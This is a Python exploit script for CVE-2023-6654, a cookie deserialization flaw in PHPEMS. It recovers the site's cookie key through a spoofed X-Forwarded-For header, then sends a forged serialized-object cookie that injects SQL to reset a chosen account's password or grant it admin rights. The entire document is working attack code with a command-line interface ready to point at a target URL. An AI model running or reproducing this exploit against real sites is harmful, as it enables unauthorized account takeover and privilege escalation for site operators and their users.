"""
CVE-2023-6654 exp python脚本
漏洞类型：PHPEMS Cookie 反序列化漏洞, V: 6.x/7.x/8.x/9.0
data: 2024-02-23
author: 清风明月
"""

import argparse
import re
import sys
from hashlib import md5
from urllib.parse import unquote

import requests

filename = sys.argv[0]


# 通过截取的32位cookie值和32位原始值还原出key
def reverse(cookie, s1):
    k = ""
    for i in range(32):
        k += chr(cookie[i] - ord(s1[i]))
    return k


# 自定义解码，解决unquote解码后使用ord获取的值异常的问题
def custom_decode(input_string):
    r = []
    i = 0
    while i < len(input_string):
        if input_string[i] == '%' and i + 2 < len(input_string):
            # 如果是URL编码的部分，解码并加入列表
            hex_value = input_string[i + 1:i + 3]
            r.append(int(hex_value, 16))
            i += 3
        else:
            # 如果是非URL编码的字符，直接获取ASCII值
            r.append(ord(input_string[i]))
            i += 1
    return r


def encode(sess, k):
    r = ""
    for i in range(len(sess)):
        r += hex(ord(sess[i]) + ord(k[i % 32])).replace("0x", "%").upper()
    r = r.replace("%", "%25")
    return r


def getKey(url):
    headers = {
        "X-Forwarded-For": "127.0.0.1",
    }
    req = requests.get(url, headers=headers)
    pattern = r'exam_currentuser=([^;]+)'
    match = re.search(pattern, req.headers["Set-Cookie"])
    s = ':"sessionip";s:9:"127.0.0.1";s:1'  # 取的是第三组32位长的值
    if match:
        t = custom_decode(unquote(match.group(1)))
        k = reverse(t[64: 96], s)
        print(f"[+] Found! key is: {k}", end="\n\n")
        return k
    else:
        print("[-] Sorry, Key is not found!", end="\n\n")
        return None


def exploit(url, key, user, passwd, option):
    sql = f'x2_user set userpassword="{md5(passwd.encode("utf-8")).digest().hex()}" where username="{user}";#--'
    if option == 1:
        sql = f'x2_user set usergroupid=1 where username="{user}";#--'
    s = 'a:2:{s:9:"sessionid";s:9:"123123123";i:0;O:14:"PHPEMS\session":3:{s:9:"sessionid";s:7:"1111111";s:6:"' \
        'pdosql";O:13:"PHPEMS\pdosql":2:{s:17:"' + chr(0) + 'PHPEMS\pdosql' + chr(0) + 'db";O:12:"PHPEMS\pepdo"' \
        + ':1:{s:20:"' + chr(0) + 'PHPEMS\pepdo' + chr(0) + 'linkid";i:0;}s:8:"tablepre";s:' + str(len(sql)) + f':"' \
        + sql + '";}s:2:"db";O:12:"PHPEMS\pepdo":1:{s:20:"' + chr(0) + 'PHPEMS\pepdo' + chr(0) + 'linkid";i:0;}}}'
    print(f"[+] serialize date is: {s}", end="\n\n")
    payload = encode(s, key)
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "Cookie": f"exam_currentuser={payload}"
    }
    print(f"[+] urlencode payload is: {payload}", end="\n\n")
    requests.get(url, headers=headers)
    print("[+] Success!", end="\n\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PHPEMS CVE-2023-6654 exp")
    parser.add_argument("-u", "--url", required=True, help="Target PHPEMS URL; Example: http://ip:port.", type=str)
    parser.add_argument("-a", "--account", default="peadmin", help="PHPEMS admin account, default is pedamin.",
                        type=str)
    parser.add_argument("-p", "--passwd", default="123456", help="PHPEMS admin account's password, default is 123456.",
                        type=str)
    parser.add_argument("-o", "--option", default=0, type=int,
                        help="Options, 0 is change account password, 1 is change account roles, detault is 0")
    args = parser.parse_args()
    key = getKey(args.url)
    assert key is not None
    exploit(args.url, key, args.account, args.passwd, args.option)
